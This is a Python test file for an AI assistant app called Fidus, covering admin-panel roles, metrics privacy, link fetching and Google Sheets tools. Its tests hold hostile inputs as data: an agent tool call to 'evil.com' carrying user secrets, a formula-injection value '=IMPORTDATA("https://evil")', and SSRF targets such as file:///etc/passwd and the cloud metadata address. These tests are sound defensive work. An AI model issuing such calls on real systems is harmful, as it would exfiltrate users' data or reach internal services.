"""v0.9.4: painel da empresa (/admin), medição, satisfação; links e planilhas para o Fidus."""
import json
import os
import re
import tempfile

os.environ.setdefault("FIDUS_DB_PATH", tempfile.mktemp(suffix=".db"))
os.environ.setdefault("FIDUS_APP_TOKEN", "t")

import pytest  # noqa: E402
from fastapi.testclient import TestClient  # noqa: E402

from app import accounts, admin, agent, google_client, llm, main, metrics, store, tools, web_tools  # noqa: E402

client = TestClient(main.app)
H = {"Authorization": "Bearer t"}
X = {"X-Fidus-Admin": "1"}


class FakeCreds:
    granted_scopes = sorted(google_client.REQUIRED)

    def to_json(self):
        return '{"token": "x", "refresh_token": "y", "client_id": "c", "client_secret": "s"}'


def login(monkeypatch, email):
    main._book_hits.clear()
    accounts.invite(email, "essencial")
    monkeypatch.setattr(google_client, "auth_url", lambda: ("https://g/x", f"s94-{email}", "v"))
    monkeypatch.setattr(google_client, "exchange", lambda url, state, ver: (
        FakeCreds(), {"email": email, "name": "Ana", "verified": True, "sub": "sub-" + email}))
    client.get("/auth/google/login", follow_redirects=False)
    page = client.get(f"/auth/google/callback?state=s94-{email}&code=abc").text
    code = re.search(r"login\?code=([A-Z0-9]{8})", page).group(1)
    return {"Authorization": f"Bearer {client.post('/v1/auth/exchange', json={'code': code}).json()['token']}"}


def panel(headers):
    """Pega o código no app e entra no painel num navegador novo."""
    code = client.post("/v1/admin/panel_code", headers=headers).json()["code"]
    browser = TestClient(main.app, base_url="https://testserver")
    r = browser.post("/admin/api/login", json={"code": code})
    assert r.status_code == 200, r.text
    return browser


# ---------- painel ----------
def test_owner_dashboard_flow(monkeypatch):
    monkeypatch.setattr(agent.llm, "chat", lambda s, m, t, **kw: {"text": "oi", "tool_calls": []})
    assert client.get("/admin").status_code == 200 and "Fidus Control Room" in client.get("/admin").text
    assert client.get("/admin/api/me").status_code == 401
    b = panel(H)
    me = b.get("/admin/api/me").json()
    assert me["role"] == "owner" and set(me["screens"]) == {"system", "heart", "business", "clients", "team"}
    client.post("/v1/message", json={"text": "oi"}, headers=H)  # gera um pedido medido
    sysd = b.get("/admin/api/system").json()
    assert "series" in sysd and sysd["requests_24h"] >= 1
    assert "happiness" in b.get("/admin/api/heart").json()
    assert "mrr_by_currency" in b.get("/admin/api/business").json()
    assert b.get("/admin/api/clients").json()["can_manage"]
    assert b.post("/admin/api/backup").status_code == 403  # sem o cabeçalho anti-CSRF
    assert b.post("/admin/api/backup", headers=X).json()["ok"]


def test_code_is_single_use_and_staff_only(monkeypatch):
    code = client.post("/v1/admin/panel_code", headers=H).json()["code"]
    assert client.post("/admin/api/login", json={"code": code}).status_code == 200
    assert client.post("/admin/api/login", json={"code": code}).status_code == 400
    tok = login(monkeypatch, "cliente94@x.com")
    assert client.post("/v1/admin/panel_code", headers=tok).status_code == 403  # cliente comum não entra


def test_support_role_sees_no_money_and_no_content(monkeypatch):
    owner = panel(H)
    assert owner.post("/admin/api/team", json={"email": "sup@x.com", "role": "support"}, headers=X).json()["ok"]
    tok = login(monkeypatch, "sup@x.com")
    assert client.get("/v1/me", headers=tok).json()["staff_role"] == "support"
    sup = panel(tok)
    assert sup.get("/admin/api/business").status_code == 403
    assert sup.get("/admin/api/team").status_code == 403
    rows = sup.get("/admin/api/clients").json()
    assert rows["can_manage"] is False and all("price" not in c and "ai_cost_month_usd" not in c for c in rows["clients"])
    blob = json.dumps(rows) + json.dumps(sup.get("/admin/api/heart").json())
    store.add_message("user", "segredo do cliente 1234")
    assert "segredo" not in blob
    assert sup.post(f"/admin/api/clients/{store.OWNER_ID}/plan", json={"plan": "premium"}, headers=X).status_code == 403
    # tirado da equipe: a sessão cai na hora
    who = [s["email"] for s in owner.get("/admin/api/team").json()["staff"]]
    assert "sup@x.com" in who
    owner.delete("/admin/api/team/sup@x.com", headers=X)
    assert sup.get("/admin/api/me").status_code == 401
    log = owner.get("/admin/api/team").json()["audit"]
    assert any(a["action"] == "team.remove" for a in log) and any(a["action"] == "clients.view" for a in log)


def test_only_owner_adds_admins(monkeypatch):
    owner = panel(H)
    owner.post("/admin/api/team", json={"email": "adm@x.com", "role": "admin"}, headers=X)
    adm = panel(login(monkeypatch, "adm@x.com"))
    assert adm.post("/admin/api/team", json={"email": "z@x.com", "role": "admin"}, headers=X).status_code == 403
    assert adm.post("/admin/api/team", json={"email": "z@x.com", "role": "finance"}, headers=X).json()["ok"]


def test_feedback_nps_and_tasks(monkeypatch):
    tok = login(monkeypatch, "fb@x.com")
    assert client.post("/v1/feedback", json={"value": 1}, headers=tok).json()["ok"]
    assert client.post("/v1/nps", json={"score": 11}, headers=tok).status_code == 400
    assert client.post("/v1/nps", json={"score": 9, "comment": "ótimo"}, headers=tok).json()["ok"]
    assert client.post("/v1/nps", json={"score": 0}, headers=tok).json()["ok"] is False  # uma por mês
    monkeypatch.setattr(agent.llm, "chat", lambda s, m, t, **kw: {"text": "feito", "tool_calls": []})
    client.post("/v1/message", json={"text": "oi"}, headers=tok)
    h = panel(H).get("/admin/api/heart").json()
    assert h["happiness"]["thumbs_up"] >= 1 and h["happiness"]["nps_answers"] >= 1
    assert h["adoption"]["first_ask"] >= 1 and h["engagement"]["dau"] >= 1
    assert any(c["comment"] == "ótimo" for c in h["happiness"]["comments"])


def test_nps_due_rules():
    assert metrics.nps_due("ninguem", "2026-01-01T00:00:00+00:00") is False  # sem uso
    for _ in range(5):
        metrics.record_task("usuario_nps", "texto", True)
    assert metrics.nps_due("usuario_nps", "2020-01-01T00:00:00+00:00") is True
    assert metrics.nps_due("usuario_nps", "2999-01-01T00:00:00+00:00") is False  # conta nova
    metrics.add_nps("usuario_nps", 8)
    metrics.flush()
    assert metrics.nps_due("usuario_nps", "2020-01-01T00:00:00+00:00") is False


def test_admin_cannot_demote_admin(monkeypatch):
    owner = panel(H)
    owner.post("/admin/api/team", json={"email": "a1@x.com", "role": "admin"}, headers=X)
    owner.post("/admin/api/team", json={"email": "a2@x.com", "role": "admin"}, headers=X)
    a1 = panel(login(monkeypatch, "a1@x.com"))
    assert a1.post("/admin/api/team", json={"email": "a2@x.com", "role": "support"}, headers=X).status_code == 403
    assert a1.post(f"/admin/api/clients/{store.OWNER_ID}/plan", json={"plan": "essencial"}, headers=X).status_code == 403


def test_errors_never_keep_message_text():
    try:
        raise ValueError("email do cliente: ana@segredo.com")
    except ValueError as e:
        d = metrics.error_detail(e)
    assert "segredo" not in d and d.startswith("ValueError")


def test_metrics_never_store_ids_in_paths():
    assert metrics.norm_path("/book/abc123slug/slots") == "/book/:id/slots"
    assert metrics.norm_path("/v1/meetings/123") == "/v1/meetings/:id"
    assert metrics.norm_path("/v1/actions/abc123def456") == "/v1/actions/:id"


# ---------- links ----------
def test_open_link_blocks_internal_addresses():
    for bad in ("http://127.0.0.1/admin", "http://localhost:8000/", "file:///etc/passwd", "http://169.254.169.254/latest",
                "http://10.0.0.5/", "http://user:pw@example.com/", "ftp://example.com"):
        with pytest.raises(ValueError):
            web_tools._check_url(bad)


def test_html_to_text_and_email_links():
    page = web_tools.html_to_text("<html><head><title>Fatura</title><script>x()</script></head><body><p>Total £10</p>"
                                  "<a href='/pagar'>Pagar</a></body></html>", "https://loja.com/a")
    assert page["title"] == "Fatura" and "Total £10" in page["text"] and "x()" not in page["text"]
    assert page["links"][0]["url"] == "https://loja.com/pagar"


class R:
    status = 200
    headers = {"content-type": "text/html; charset=utf-8"}

    def stream(self, n):
        yield b"<title>Ok</title><p>Reserva confirmada</p>"

    def release_conn(self):
        pass


def test_open_link_through_tool(monkeypatch):
    monkeypatch.setattr(web_tools, "_resolve", lambda h: "93.184.216.34")
    monkeypatch.setattr(web_tools, "_fetch", lambda url: R())
    web_tools.begin("o que tem em https://exemplo.com ?")
    out = tools.run("open_link", {"url": "https://exemplo.com"})
    assert out["title"] == "Ok" and "Reserva confirmada" in out["text"] and out["aviso"]
    # a IA não pode inventar um endereço (ex. com dados do usuário) que não veio do usuário nem do que foi lido
    assert "segurança" in tools.run("open_link", {"url": "https://evil.com/?d=segredo"})["error"]
    web_tools.note_output('{"links": [{"url": "https://loja.com/pedido/9"}]}')  # link que veio num e-mail lido
    assert "error" not in tools.run("open_link", {"url": "https://loja.com/pedido/9"})


def test_ssrf_blocks_cgnat_and_metadata(monkeypatch):
    assert web_tools._resolve("100.100.100.200") is None and web_tools._resolve("169.254.169.254") is None
    assert web_tools._resolve("::ffff:127.0.0.1") is None and web_tools._resolve("0.0.0.0") is None


# ---------- planilhas ----------
class FakeSheets:
    def __init__(self):
        self.data = {"Folha1": [["Nome", "Telefone"], ["Ana", "1"]]}
        self.calls = []

    def spreadsheets(self):
        return self

    def values(self):
        return self

    def get(self, spreadsheetId, fields=None, range=None, valueRenderOption=None):  # noqa: A002
        if fields:
            return E({"properties": {"title": "Clientes"}, "sheets": [{"properties": {"title": "Folha1", "sheetId": 7}}]})
        m = re.search(r"A(\d+):B(\d+)$", range or "")
        if m:
            return E({"values": self.data["Folha1"][int(m.group(1)) - 1:int(m.group(2))]})
        return E({"values": self.data["Folha1"]})

    def append(self, spreadsheetId, range, valueInputOption, insertDataOption, body):  # noqa: A002
        self.data["Folha1"] += body["values"]
        n = len(self.data["Folha1"])
        return E({"updates": {"updatedRange": f"Folha1!A{n}:B{n}"}})

    def update(self, spreadsheetId, range, valueInputOption, body):  # noqa: A002
        self.calls.append(("update", range, body))
        return E({"updatedRange": range, "updatedCells": 1})

    def clear(self, spreadsheetId, range, body):  # noqa: A002
        self.calls.append(("clear", range))
        return E({})

    def batchUpdate(self, spreadsheetId, body):
        self.calls.append(("delete_rows", body["requests"][0]["deleteDimension"]["range"]))
        return E({})


class E:
    def __init__(self, v):
        self.v = v

    def execute(self):
        return self.v


def test_sheet_remember_read_append_and_undo(monkeypatch):
    fake = FakeSheets()
    monkeypatch.setattr(google_client, "sheets", lambda: fake)
    link = "https://docs.google.com/spreadsheets/d/1AbCdEfGhIjKlMnOpQrStUvWxYz0123456789/edit#gid=0"
    assert tools.run("remember_sheet", {"link": link, "name": "x"})["error"]  # link que o usuário não mandou
    web_tools.begin(f"salva essa planilha: {link}")
    assert tools.run("remember_sheet", {"link": link, "name": "clientes da loja"})["ok"]
    assert tools.run("read_sheet", {"sheet": "clientes da loja"})["rows"][0] == ["Nome", "Telefone"]
    steps = iter([{"text": "", "tool_calls": [{"id": "1", "name": "append_rows",
                                                "input": {"sheet": "clientes", "rows": [["Bia", "=IMPORTDATA(\"https://evil\")"]]}}]},
                  {"text": "Adicionei a Bia.", "tool_calls": []}])
    monkeypatch.setattr(agent.llm, "chat", lambda s, m, t, **kw: next(steps))
    monkeypatch.setattr(agent.tools, "run", tools.run)
    r = client.post("/v1/message", json={"text": "coloca a Bia na planilha de clientes"}, headers=H).json()
    assert r["reply"] == "Adicionei a Bia." and fake.data["Folha1"][-1] == ["Bia", "'=IMPORTDATA(\"https://evil\")"]  # fórmula vira texto
    act = [a for a in client.get("/v1/activity", headers=H).json()["items"] if a["kind"] == "sheet_changed"][0]
    assert act["can_undo"]
    assert client.post(f"/v1/activity/{act['id']}/undo", headers=H).json()["status"] == "desfeito"
    assert fake.calls[-1] == ("delete_rows", {"sheetId": 7, "dimension": "ROWS", "startIndex": 2, "endIndex": 3})
    # planilha desconhecida: não escreve
    assert "error" in web_tools.append_rows("https://docs.google.com/spreadsheets/d/ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ/edit", [["x"]])
    with pytest.raises(ValueError):
        web_tools._sheet_id("planilha que não existe")


def test_ics_calendar_is_parsed():
    from datetime import datetime, timedelta
    d = (datetime.utcnow() + timedelta(days=2)).strftime("%Y%m%d")
    old = (datetime.utcnow() - timedelta(days=200)).strftime("%Y%m%d")
    ics = ("BEGIN:VCALENDAR\r\nBEGIN:VEVENT\r\nDTSTART:" + d + "T090000Z\r\nDTEND:" + d + "T170000Z\r\nSUMMARY:Turno loj\r\n a\r\n"
           "LOCATION:Loja 1\r\nEND:VEVENT\r\nBEGIN:VEVENT\r\nDTSTART:" + old + "T090000Z\r\nSUMMARY:Velho\r\nEND:VEVENT\r\nEND:VCALENDAR")
    evs = web_tools.parse_ics(ics)
    assert len(evs) == 1 and evs[0]["title"] == "Turno loja" and evs[0]["location"] == "Loja 1"
    assert web_tools._check_url.__name__ and web_tools.urlparse(
        "https://x.com").scheme == "https"


def test_saved_calendar_link(monkeypatch):
    monkeypatch.setattr(web_tools, "_resolve", lambda h: "93.184.216.34")
    monkeypatch.setattr(web_tools, "_fetch", lambda url: R())
    web_tools.begin("salva a escala: webcal://app.connecteam.com/cal/abc.ics")
    assert tools.run("remember_link", {"url": "webcal://app.connecteam.com/cal/abc.ics", "name": "escala Connecteam"})["ok"]
    web_tools.begin("pega as notas da escala")  # outro pedido, sem o link
    assert "error" not in tools.run("open_link", {"url": "escala Connecteam"})
    assert tools.run("remember_link", {"url": "https://evil.com/x", "name": "y"})["error"]
